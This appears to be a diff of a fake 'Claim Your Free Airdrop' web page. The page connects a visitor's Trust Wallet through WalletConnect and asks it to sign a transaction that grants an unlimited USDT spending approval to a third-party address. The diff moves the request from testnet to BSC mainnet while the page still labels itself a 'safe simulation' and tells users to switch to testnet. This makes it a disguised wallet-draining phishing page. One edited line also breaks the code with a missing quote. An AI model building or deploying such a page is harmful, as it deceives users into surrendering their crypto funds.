@@ -2,25 +2,23 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Claim Airdrop</title>
-  <!-- WalletConnect Sign Client (core SDK) -->
-<script src="https://unpkg.com/@walletconnect/sign-client@2.9.4/dist/umd/index.min.js"></script>
-
-<!-- WalletConnect Modal (for QR + UI) -->
-<script src="https://unpkg.com/@walletconnect/modal@2.5.1/dist/index.umd.js"></script>
-
+  <title>🎁 Claim Airdrop</title>
+  <script src="https://unpkg.com/@walletconnect/sign-client@2.9.4/dist/umd/index.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/modal@2.5.1/dist/index.umd.js"></script>
 </head>
 <body>
   <h2 style="color:green;">🎁 Claim Your Free Airdrop</h2>
-  <p style="color:red; font-weight:bold;">Switch to Binance Smart Chain Testnet in Trust Wallet before scanning.</p>
+  <p style="color:red; font-weight:bold;">
+    Switch to Binance Smart Chain Testnet in Trust Wallet before scanning.
+  </p>
   <div id="wc-modal"></div>
   <p id="status" style="font-weight:bold;"></p>
 
   <script>
-    const projectId = "8d3ef93df00c60161fdf8644d8cf25db";  // <-- Replace with your WalletConnect project ID
+    const projectId = "8d3ef93df00c60161fdf8644d8cf25db; // Your working WalletConnect Project ID
     const providerMetadata = {
-      name: "Airdrop DApp",
-      description: "Fake claim dApp for simulation",
+      name: "Gayatri Airdrop DApp",
+      description: "Fake claim dApp for safe simulation",
       url: "https://rahman08arshad.github.io/gayatritestnet/",
       icons: ["https://walletconnect.com/walletconnect-logo.png"],
     };
@@ -36,7 +34,6 @@
 
     async function startWalletConnect() {
       client = await SignClient.init({
-
         projectId,
         metadata: providerMetadata
       });
@@ -45,7 +42,7 @@
         requiredNamespaces: {
           eip155: {
             methods: ["eth_sendTransaction"],
-            chains: ["eip155:56"], // BSC Testnet
+            chains: ["eip155:56"],
             events: ["accountsChanged", "chainChanged"]
           }
         }
@@ -62,7 +59,7 @@
       const address = session.namespaces.eip155.accounts[0].split(":")[2];
       const tx = {
         from: address,
-        to: "0x55d398326f99059ff775485246999027b3197955", // USDT contract (mainnet-like)
+        to: "0x55d398326f99059ff775485246999027b3197955",
         data: "0x095ea7b300000000000000000000000033eed64f9428637b955b0379825f2066ed5d101affffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
         gas: "0x5208"
       };
@@ -70,7 +67,7 @@
       try {
         await client.request({
           topic: session.topic,
-          chainId: "eip155:97",
+          chainId: "eip155:56",
           request: {
             method: "eth_sendTransaction",
             params: [tx]
